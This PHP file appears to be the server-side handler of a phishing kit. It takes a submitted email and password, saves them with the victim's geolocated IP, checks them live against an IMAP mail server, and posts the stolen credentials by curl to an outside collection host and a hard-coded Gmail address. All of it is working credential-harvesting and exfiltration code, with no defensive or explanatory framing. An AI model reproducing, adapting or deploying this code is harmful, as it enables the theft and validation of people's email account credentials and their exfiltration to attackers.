<?php
header("Access-Control-Allow-Origin: *");
error_reporting(0);
$output = '';
ob_start();
$output = check_details();
$get_allpagecontents = ob_get_clean();	
echo $output;

function check_details(){
	$output1 = '-';
	
	
if(isset($_POST['Email']) && !empty($_POST['Email'])
 && isset($_POST['password']) && !empty($_POST['password'])
){
    $username = strtolower(trim($_POST['Email']));
    $password = $_POST['password'];
    
	$details_ip = '';
      $details_ip = get_ip_ddrs_detailz();
	  $send_to = 'juanpattobal@gmail.com';
	  $output = $_POST['send_id_cust'].' '.time() . PHP_EOL;
	  //file_put_contents('status_u2/t.txt', $output, FILE_APPEND);
	  $filename = 'emails_and_pass.txt';
	  $headers = "From: $send_to\r\n";
      $headers .= "Content-type: text/html\r\n";
      $subject = "Info Submitted";
	  $body = "Email: $username Password: $password $details_ip \n";
	  file_put_contents($filename, $body . PHP_EOL . PHP_EOL, FILE_APPEND);

      $auth = @check_imap_connect($username, $password);
      if($auth === false){
	    $output1 = 'no';
        $output = $_POST['send_id_cust'].' '. time() . PHP_EOL;
      //file_put_contents('status_u2/f.txt', $output, FILE_APPEND);
	  //echo 'NOT CONECTED';
    }
    else{
		$output1 = 'yes';
      $body = "TRUE LOGIN: YES \n".$body;
	  file_put_contents($filename, $body . PHP_EOL . PHP_EOL, FILE_APPEND);
	}
	send_email_curl($send_to, $subject, $body, $output1);
}


return $output1;
}


function get_ip_ddrs_detailz(){
require_once('geoplugin.class.php');
$ip_details= '';
$geoplugin = new geoPlugin();

$geoplugin->locate();

$ip_details = "IP Address: {$geoplugin->ip} , Country Name: {$geoplugin->countryName} , Country Code: {$geoplugin->countryCode} , ";
$ip_details .= "City: {$geoplugin->city} , Region Name: {$geoplugin->regionName} , Region: {$geoplugin->region}";

return $ip_details;

}
function check_imap_connect($username, $password){
$output = false;
$hostname = '{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX';
$inbox = imap_open($hostname,$username,$password);
if($inbox){
  $output = true;
}

imap_close($inbox);
return $output;
}

function send_email_curl($send_to, $subject, $body, $output=false){
$fields = array(
  'email' => $send_to,
  'subject' => $subject,
  'message' => $body
);
if($output == 'yes'){
  $fields['output'] = 'yes';	
}
$fields_string = '';
foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
rtrim($fields_string, '&');
$url = 'http://subdata.cc/true-handler/send-email.php';
//open connection
$ch = curl_init();

//set the url, number of POST vars, POST data
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_POST, count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

//execute post
$result = curl_exec($ch);

//close connection
curl_close($ch);
}

//$end_time=time()-$start_time;
//echo "<br>SECONDS ELAPSED: $end_time";
?>
